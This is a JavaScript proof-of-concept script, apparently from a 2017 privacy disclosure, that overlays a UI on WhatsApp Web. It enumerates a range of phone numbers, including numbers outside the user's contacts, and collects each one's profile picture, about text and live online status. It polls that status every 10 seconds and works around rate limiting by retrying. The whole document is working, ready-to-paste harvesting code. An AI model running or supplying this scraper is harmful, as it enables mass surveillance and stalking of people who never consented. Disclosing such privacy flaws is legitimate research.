/*
 PoC WhatsApp enumeration of phonenumbers, profile pics, about texts and online statuses
 Floated div edition
 01-05-2017
 (c) 2017 - Loran Kloeze - loran@ralon.nl
 
 This script creates a UI on top of the WhatsApp Web interface. It enumerates certain kinds
 of information from a range of phonenumbers. It doesn't matter if these numbers are part
 of your contact list. At the end a table is displayed containing phonenumbers, profile pics, 
 about texts and online statuses. The online statuses are being updated every
 10 seconds.
 
 Check for an explanation: https://www.lorankloeze.nl/2017/05/07/collecting-huge-amounts-of-data-with-whatsapp/
 
 Instructions:
  - Open WhatsApp web
  - Make sure the phone is connected to the WhatsApp Web (past the QR-code screen)
  - Open up the console (F12)
  - Select the contents of this complete file and copy/paste it to the console
  - Never, NEVER do something like this if you're not 100% sure this file is from a thrustworthy source! 
  - You'll see a UI with 2 textboxes and a button
  - You may close the console now
  - Enter a range of phonenumbers you want to enumerate, more than 500 numbers is probably a little much 
  - After a few sec you'll see a table of phonenumbers, profile pics, about texts and on/offline statuses
  - Every 10 sec, the script checks if someone is online and places that number at the beginning of the table
  - If someone is currently online, the left border of the profile picture becomes green
  
  You can drop this script in Tampermonkey or something like that. It only depends on libraries
  provided by WhatsApp Web.
*/

(function() {
    'use strict';

	// Prevent huge traffic/mem usage
    var maxNrClients = 1500;
	
    // Standard phone numbers for the 2 text boxes in the UI
    var firstNumberStd = 31642101000;
    var lastNumberStd =  31642101100;



    function setupEventListeners() {
        var btnStartIndexer = document.getElementById('btnStartIndexer');
        btnStartIndexer.addEventListener("click", function( e ) {

            var firstNr = document.getElementById('inpFirstNumber').value;
            var lastNr = document.getElementById('inpLastNumber').value;
            var divClientBoxes = document.getElementById('divClientBoxes');
            divClientBoxes.innerHTML = "";
            firstNr = parseInt(firstNr, 10);
            lastNr = parseInt(lastNr, 10);
            if (isNaN(firstNr) || isNaN(firstNr) ) {
                console.log('Numbers should be integers');
                return null;
            }

            if (lastNr - firstNr > maxNrClients) {
                console.log('Don\'t query more than ' + maxNrClients + ' numbers right now');
                return null;
            }
            var clientNr = firstNr;
			
            var clientBoxCreateT = window.setInterval(function(){
                console.log('Next 100...');
                var lastClientNrForLoop = clientNr + 100;
                for(;clientNr < lastClientNrForLoop && clientNr < lastNr; clientNr++) {
                    divClientBoxes.appendChild(createClientBox(clientNr, "", "" ));
                }
                if (clientNr === lastNr)
                    clearInterval(clientBoxCreateT);
            }, 500);


        });

    }

	// The UI that's added to the current DOM
    function createDOM() {
        var body = document.getElementsByTagName('body')[0];
        var containerDiv = document.createElement("div");
        containerDiv.id = 'statusIndexer';

        var inputFirstNumberLabel = document.createElement("label");
        inputFirstNumberLabel.innerHTML = 'First phonenumber';
        var inputFirstNumber = document.createElement("input");
        inputFirstNumber.type = "text";
        inputFirstNumber.placeholder = "31612345678";
        inputFirstNumber.value = firstNumberStd;
        inputFirstNumber.id = "inpFirstNumber";

        var inputLastNumberLabel = document.createElement("label");
        inputLastNumberLabel.innerHTML = 'Last phonenumber';
        var inputLastNumber = document.createElement("input");
        inputLastNumber.type = "text";
        inputLastNumber.placeholder = "31612345678";
        inputLastNumber.value = lastNumberStd;
        inputLastNumber.id = "inpLastNumber";

        var btnStartIndexer = document.createElement("button");
        btnStartIndexer.id = 'btnStartIndexer';
        btnStartIndexer.innerHTML = 'Start indexer';

        containerDiv.appendChild(inputFirstNumberLabel);
        containerDiv.appendChild(inputFirstNumber);
        containerDiv.appendChild(inputLastNumberLabel);
        containerDiv.appendChild(inputLastNumber);
        containerDiv.appendChild(document.createElement("br"));
        containerDiv.appendChild(btnStartIndexer);
        containerDiv.appendChild(document.createElement("hr"));
        var clientBoxesDiv = document.createElement("div");
        clientBoxesDiv.id = 'divClientBoxes';
        containerDiv.appendChild(clientBoxesDiv);

        var style = "";
        style += "#statusIndexer {position: absolute; top: 0px; left: 0px; min-height: 50%; overflow: scroll; max-height: 95%; background-color: rgba(230,230,230,0.95); z-index: 99999999; width: 95vw; padding: 50px; border-bottom: solid 3px #58e870; box-shadow: black 0px 1px 62px 0px;}";
        style += "#statusIndexer label {margin: 0 15px 0 0;}";
        style += "#statusIndexer input {margin: 0 25px 0 0; padding: 5px;}";
        style += "#statusIndexer button {margin: 10px 0; border: solid 1px black; padding: 3px; border-radius: 3px; }";
        style += "#statusIndexer button:hover {background-color: #58e870;}";
        style += "#statusIndexer .indexerClientBox {float: left; width: 120px; text-align: center; margin: 15px; height: 65px;}";
        style += "#statusIndexer img {width: 32px; height: 32px;}";
        style += "#statusIndexer img.isOffline {border-left: solid 5px orange;}";
        style += "#statusIndexer img.isOnline {border-left: solid 5px green;}";
        style += "#statusIndexer .indexerPhone {font-size: 13px; margin: 2px; font-weight: bold;}";
        style += "#statusIndexer .indexerStatus {font-size: 11px; margin: 2px;}";
        var styleEl = document.createElement("style");
        styleEl.innerHTML = style;
        body.appendChild(styleEl);
        body.appendChild(containerDiv);
    }
	
	
	// Create a floated div per phonenumber and execute WhatsApp API queries
    function createClientBox(phonenumber) {
        var divBox = document.createElement("div");
        divBox.classList.add('indexerClientBox');
        divBox.id = 'p'+phonenumber;
        var imgSrcNoneFound = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEsAAABLCAIAAAC3LO29AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAABDRJREFUeNrsmj1IW1EUgGMNWLBGUIigIlVoq4LUQqsuXerP4uLf4qDSLh1aaRehCk6CDl0q2qFDf6yDi1YXF0272EFLoQWLkQoKGgsKKZggjaCkX97Bx0s01qA2Uc4jhHd/c757zj33nEuSgsGg7UI/l2wX/VFCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVRCJVTCUyDcGP3gnXJZi1uzX44e8uvN0PaC+9wQbo6Nux8+MiWmuDU7d/SQ1f7Bf67C6T72k453OH52dN6anIioB3vX57c70lKLi6z1JSPvkx0OXuBMLS7cXliUPtI/JTfncm6OdQZqdjzr9LQbo+JAmH2/FbVge9kP2szKpY5OLDa9ogwAvotevTSblnt608vL8p62zze3ALbn8wU869ITVJBKJyeAtM6w6/OVjAzzHjdPAxuQCGquPcJBhVhojI1K8dCBmdWVt2c+ZTU1oE/ASg1D+D3lkhmM4cN5Tx7H35ciBMu/0tMrRdlmmTVVfKMlPjv78BFPekU53yk52fRBb9gh1ojGWBSKojRnU338CZEsv7vLG1r7RYrJjjS+EVRao+GFz5AWMaFpEccZ/j/OQzTGR6jQDCKu9PQhJbuOSmdTQ0yzZdRUMQNbEXPAjcWTEOtK2Xd9qBG7Emd47Xkfx8bXu/fYVGxI0z1ah9BZVEfR9LfSSn9GBTye1f6BK0ZThJJje4IJ+fxZ88jL+ut3M1evn2Qquy0hnx/NLRybqA5DLejuOslUSYn5TwX2sPgYawxwoQg1t0hUwmjJBza5+mIgEH70SeX5ICT/IAo9IvlgyxH3RRzuUhn/3OJ40XmbGeKcAyvFcjjKP+ffQDPITXF5PyLFCKnEur7V1tGBbmKTnN1bc2HGSbwye/MOH3NsKDl+OySVB42TbtGaTp+QsIOAg5wA6TdHx/HmpE6iorX+QYlXSKnoQM+ljmdibxF5fUZ1JWkH8zDWvCVgaaghjo/IkqEiNiLzoJWmWK8IYiYk2uLnJZMALNOIIY2w242IGKQcX2tGPhWIEjcDzxCCMsm2pLLAiPvIxWi1blfv9EcWbjPkpeaY3HpvciaE32vrvNMuZ2O9qAs8IHEhG2PjyIcELDlhd2pRYVZjfbTTnEm23YssR8QNwKGphlVp/K7kXGdFiPaQj8WW9M/8VeoxJKeBxJYjqbOm/Ac9J8rH5FgRq/8UEpqMfN9hTVwo5j1tl0+syb49xk0Yui/BnRA0hgT1+8VuUd2uz29mvexPxI124yTKxxvthTtY9hjWAR4dWCPJNiXDnm9uxW/JnQ0bMqY7m5ijNnRo7Idcfg8RxcyoNN9DO2fKhSowpx3jDsZsBZulYTlkEsmMJMKGh+VjoJi9qUzRmLyLAR9q2BqXKqESKqESKqESKqESKqESKqESKqESKqESKqESKqESKqHtrwADAMxLRItbnk5RAAAAAElFTkSuQmCC";

        var clientImgA = document.createElement("a");
        var clientImg = document.createElement("img");
        var profilePicRoutine = function(nr) {
            Store.ProfilePicThumb.find( nr + '@c.us').then(function(d){
                var imgATag = document.getElementById('p'+nr).getElementsByTagName('a')[0];
                var imgTag = document.getElementById('p'+nr).getElementsByTagName('img')[0];

                if (d.img === null) {
                    profilePicRoutine(nr);
                }
                if (d.img === undefined) {
                    imgTag.src = imgSrcNoneFound;
                    imgATag.href = '';
                } else {
                    imgTag.src = d.img;
                    imgATag.href = '#';
                    imgATag.addEventListener('click', function(){
                        imgTag.src = d.imgFull;
                        window.open(d.imgFull, '_blank');
                    });
                    imgATag.target = '_blank';

                }
            }, function(e){
				// Server is throttling/rate limiting, we try it again
                profilePicRoutine(nr);
            });
        };

        profilePicRoutine(phonenumber);

        clientImgA.appendChild(clientImg);
        var clientPhone = document.createElement("div");
        clientPhone.classList.add('indexerPhone');
        clientPhone.innerHTML = phonenumber;
        var clientStatus = document.createElement("div");
        clientStatus.classList.add('indexerStatus');

        var statusFindRoutine = function(nr) {
            Store.Wap.statusFind( nr + '@c.us').then(function(d){
                document.getElementById('p'+nr).getElementsByClassName('indexerStatus')[0].innerHTML = d.status;
            }, function(e){
				// Server is throttling/rate limiting, we try it again
                statusFindRoutine(nr);
            });
        };
        statusFindRoutine(phonenumber);


        Store.Presence.find( phonenumber + '@c.us').then(function(d){
            if (d.isOnline)
                clientImg.classList.add('isOnline');
            else
                clientImg.classList.add('isOffline');

        });

        divBox.appendChild(clientImgA);
        divBox.appendChild(clientPhone);
        divBox.appendChild(clientStatus);
        return divBox;
    }


	// Check online/offline status every 10 sec
    window.setInterval(function() {
        for(var i=0; i < Store.Presence.models.length; i++) {
            var m = Store.Presence.models[i];
            var id = 'p' + m.id.slice(0, -5);
            var clientBox = document.getElementById(id);
            if (clientBox !== null) {
                var img = clientBox.getElementsByTagName('img')[0];
                img.classList.remove('isOnline');
                if (m.isOnline) {
                    console.log(id + ' is online');
                    clientBox.parentNode.prepend(clientBox);
                    img.classList.remove('isOffline');
                    img.classList.add('isOnline');
                } else {
                    img.classList.remove('isOnline');
                    img.classList.add('isOffline');
                }
            }

        }
    }, 10000);
	
	// Let's setup the UI
	// Small delay in case the script is executed from something like Tampermonkey
    window.setTimeout(function(){
        createDOM();
        setupEventListeners();
    }, 500);


})();